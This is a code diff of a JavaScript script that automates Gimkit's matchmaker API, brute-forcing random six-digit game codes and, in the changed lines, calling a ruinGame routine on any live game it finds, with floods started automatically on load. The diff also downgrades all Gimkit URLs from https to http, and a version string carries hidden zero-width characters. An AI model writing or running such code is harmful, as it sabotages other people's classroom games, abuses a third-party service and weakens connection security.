@@ -7,7 +7,7 @@ for (var i = 0; i < 9999; i++) {
 
 async function createGame() {
     return await fetch(
-        "https://www.gimkit.com/api/matchmaker/intent/map/play/create",
+        "http://www.gimkit.com/api/matchmaker/intent/map/play/create",
         {
             credentials: "include",
             headers: {
@@ -22,7 +22,7 @@ async function createGame() {
                 Pragma: "no-cache",
                 "Cache-Control": "no-cache",
             },
-            referrer: "https://www.gimkit.com/view/6405e689a177900032ecbd06",
+            referrer: "http://www.gimkit.com/view/6405e689a177900032ecbd06",
             body: JSON.stringify({
                 experienceId: "642370ce55297d003834e1a1",
                 matchmakerOptions: {
@@ -49,7 +49,7 @@ var gkversion = "Gimkit Web ⁤‍⁡⁢⁡⁢⁣⁢⁡‍⁡⁢‌⁢‌⁣⁡�
 
 async function get_info_from_code(code) {
     return await fetch(
-        "https://www.gimkit.com/api/matchmaker/find-info-from-code",
+        "http://www.gimkit.com/api/matchmaker/find-info-from-code",
         {
             headers: {
                 accept: "application/json, text/plain, */*",
@@ -65,7 +65,7 @@ async function get_info_from_code(code) {
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-origin",
             },
-            referrer: "https://www.gimkit.com/join",
+            referrer: "http://www.gimkit.com/join",
             referrerPolicy: "strict-origin-when-cross-origin",
             body: JSON.stringify({ code: code }),
             method: "POST",
@@ -80,7 +80,7 @@ async function code_exists(code) {
 }
 
 async function joinAPI(roomId, name) {
-    return await fetch("https://www.gimkit.com/api/matchmaker/join", {
+    return await fetch("http://www.gimkit.com/api/matchmaker/join", {
         headers: {
             accept: "application/json, text/plain, */*",
             "accept-language": "en-US,en;q=0.9",
@@ -95,7 +95,7 @@ async function joinAPI(roomId, name) {
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-origin",
         },
-        referrer: "https://www.gimkit.com/join",
+        referrer: "http://www.gimkit.com/join",
         referrerPolicy: "strict-origin-when-cross-origin",
         body: JSON.stringify({
             roomId: roomId,
@@ -121,7 +121,7 @@ async function matchmake(serverUrl, roomId, intentId, authToken) {
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "cross-site",
         },
-        referrer: "https://www.gimkit.com/",
+        referrer: "http://www.gimkit.com/",
         referrerPolicy: "strict-origin-when-cross-origin",
         body: null,
         method: "OPTIONS",
@@ -144,7 +144,7 @@ async function matchmake(serverUrl, roomId, intentId, authToken) {
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "cross-site",
         },
-        referrer: "https://www.gimkit.com/",
+        referrer: "http://www.gimkit.com/",
         referrerPolicy: "strict-origin-when-cross-origin",
         body: JSON.stringify({
             intentId: intentId,
@@ -157,7 +157,7 @@ async function matchmake(serverUrl, roomId, intentId, authToken) {
 }
 
 async function getUserInfo() {
-    return await fetch("https://www.gimkit.com/pages/general", {
+    return await fetch("http://www.gimkit.com/pages/general", {
         headers: {
             accept: "application/json, text/plain, */*",
             "accept-language": "en-US,en;q=0.9",
@@ -171,7 +171,7 @@ async function getUserInfo() {
             "sec-fetch-mode": "cors",
             "sec-fetch-site": "same-origin",
         },
-        referrer: "https://www.gimkit.com/me",
+        referrer: "http://www.gimkit.com/me",
         referrerPolicy: "strict-origin-when-cross-origin",
         body: null,
         method: "GET",
@@ -192,7 +192,7 @@ async function connect(
 
     if (join["source"] == "original") {
         // wss://serverUrl/blueboat/?id=roomId&EIO=3&transport=websocket
-        var webSocketUrl = `${join.serverUrl.replace("https", "wss")}/blueboat/?id=${join.roomId
+        var webSocketUrl = `${join.serverUrl.replace("http", "wss")}/blueboat/?id=${join.roomId
             }&EIO=3&transport=websocket`;
         var sendTicks = 0;
         var blueboat = true;
@@ -200,7 +200,7 @@ async function connect(
         var matchmade = await (
             await matchmake(join.serverUrl, join.roomId, join.intentId, authToken)
         ).json();
-        var webSocketUrl = `${join.serverUrl.replace("https", "wss")}/${matchmade.room.processId
+        var webSocketUrl = `${join.serverUrl.replace("http", "wss")}/${matchmade.room.processId
             }/${join.roomId}?sessionId=${matchmade.sessionId}`;
         var blueboat = false;
     }
@@ -251,7 +251,10 @@ async function randomFlood() {
     var randomCode = (111111 + Math.floor(Math.random() * 888888)).toString();
     if (await code_exists(randomCode)) {
         console.warn(`CODE FOUND ${randomCode}`);
-        fetch(`/api/fndcof?c=${randomCode}`);
+        let oldPerformanceDecrease = performanceDecrease;
+        performanceDecrease = 0.001;
+        await ruinGame(randomCode);
+        performanceDecrease = oldPerformanceDecrease;
     }
 
     const endTime = performance.now();
@@ -273,11 +276,12 @@ function isIOS() {
 
 performanceDecrease = 1;
 
-if(isIOS()) {
+// if(isIOS()) {
+//     startFloods(1);
+// } else {
+startFloods(1);
+
+if(window.location.href == "/") {
     startFloods(1);
-} else {
-    startFloods(2);
-    if(window.location.href == "/") {
-        startFloods(1);
-    }
 }
+// }
